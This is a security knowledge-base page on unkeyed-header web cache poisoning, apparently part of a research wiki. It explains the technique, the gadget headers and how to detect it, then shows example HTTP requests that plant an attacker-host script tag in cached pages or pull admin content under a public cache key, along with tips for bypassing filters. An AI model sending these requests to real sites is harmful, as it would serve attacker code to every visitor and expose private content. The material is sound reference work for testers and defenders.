---
title: Unkeyed-header cache poisoning
slug: unkeyed-header
created_utc: 2026-05-19T00:00:00Z
updated_utc: 2026-05-19T00:00:00Z
tags: [technique/cache-poisoning, header/X-Forwarded-Host, header/X-Forwarded-Scheme, header/X-Original-URL]
inbound: []
---

# Unkeyed-header cache poisoning

## Pattern

The cache key is built from `Host` + method + path + (sometimes) `Vary` headers. Any other header the application reads but the cache excludes from the key is an **unkeyed input**. If the application reflects an unkeyed header into the response — directly or via a redirect / `<base>` / `<script src>` / JSON config — the attacker can poison the cached response under the legitimate cache key.

## Preconditions

- A caching layer that stores responses (positive `Cache-Control`, `Age:`, `X-Cache: HIT` observable).
- Application code that reads a header the cache key omits and reflects its value somewhere consequential in the response.
- The reflection must survive cache TTL (no per-user content interleaving via `Vary: Cookie`, `Vary: Authorization`, etc., for the targeted response).

## Common gadget headers

| Header | Typical application use | Cached effect |
|---|---|---|
| `X-Forwarded-Host` | Constructs absolute URLs / `<base>` href | Attacker's host in cached `<script src>` |
| `X-Forwarded-Scheme` / `X-Forwarded-Proto` | Builds protocol part of URL | Forces `http://` to leak referers / lose secure cookie path |
| `X-Original-URL` / `X-Rewrite-URL` (IIS, Symfony) | Internal routing override | Cache stores `/public` URL but body came from `/admin` |
| `X-Host` | Same as XFH on some stacks | Same |
| `X-Forwarded-Server` | Apache mod_rewrite | URL pollution |
| `Forwarded` (RFC 7239) | Replaces XFH on modern stacks | Same as XFH |
| `User-Agent` | Mobile / desktop variant switch | Variant confusion if not in Vary |
| `Accept-Language` | i18n redirect | Locale poisoning |

## Detection

1. Issue a baseline request. Note `Age:` / `X-Cache:` / `CF-Cache-Status:` to confirm cacheability.
2. Vary one header at a time with a fingerprint value (`X-Forwarded-Host: canary-<rand>.attacker.test`).
3. Look for the canary anywhere in the response body, headers, redirect Location, or a subsequent request's behavior.
4. If canary appears, fire the same request again with `Cache-Buster: <rand>` in the URL (`?cb=<rand>`) — confirm the canary persists for follow-up clean requests on the same `cb` value.

PortSwigger "Param Miner" Burp extension automates header guessing across a large dictionary.

## Triggering

`X-Forwarded-Host` reflected into a `<script src>` in the response:

```
GET /en/index HTTP/1.1
Host: target.example
X-Forwarded-Host: attacker.test
```

Response (cached against `target.example /en/index`):

```html
<script src="//attacker.test/static/app.js"></script>
```

Every subsequent user requesting `/en/index` loads attacker JS.

`X-Original-URL` rewriting cache content:

```
GET /public/homepage HTTP/1.1
Host: target.example
X-Original-URL: /admin/dashboard
```

Cache stores `/admin/dashboard` body under `/public/homepage` cache key. Attacker now reads admin content by visiting `/public/homepage`. (This is also a confidentiality leak even before further chaining.)

## Bypasses

- Cache-Buster the URL to scope to a unique key per attempt so failed attempts don't poison the live cache permanently. Once exploitation works, drop the buster.
- Combine two unkeyed headers — sometimes a single reflection isn't useful but two together build a complete URL (`X-Forwarded-Scheme` + `X-Forwarded-Host`).
- Some caches strip request headers selectively; smuggle the header in via [request smuggling](../request-smuggling/SUMMARY.md) when direct injection is filtered.

## Impact ladder

1. Cached stored XSS on every visitor.
2. Cached open redirect — phishing at the legitimate domain.
3. Cached internal-content leak (X-Original-URL).
4. Cached cookie-bomb / 4xx DoS on a critical asset.

## Seen-in-the-wild

- Multiple PortSwigger Academy labs reproduce this exact vector.
- Detectify documented several real findings under "Do you trust your cache?".
- The PortSwigger "Practical Web Cache Poisoning" paper is the canonical write-up.

## References

- [Cache poisoning SUMMARY](SUMMARY.md)
- [research-practical-web-cache-poisoning](../../sources/blogs/personal/portswigger-research/research-practical-web-cache-poisoning.md)
- [Detectify — 10 missed vulns (#7)](../../sources/blogs/detectify/security-guidance-10-types-of-web-vulnerabilities-that-are-often-missed.md)
